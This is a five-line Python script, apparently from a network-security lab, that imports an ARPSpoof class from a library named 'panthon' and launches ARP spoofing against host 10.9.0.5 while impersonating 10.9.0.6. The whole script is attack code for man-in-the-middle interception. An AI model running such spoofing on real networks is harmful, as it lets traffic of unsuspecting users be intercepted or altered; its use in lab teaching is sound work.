from panthon import ARPSpoof

arp=ARPSpoof(target_ip="10.9.0.5", spoof_ip= "10.9.0.6")

arp.spoof()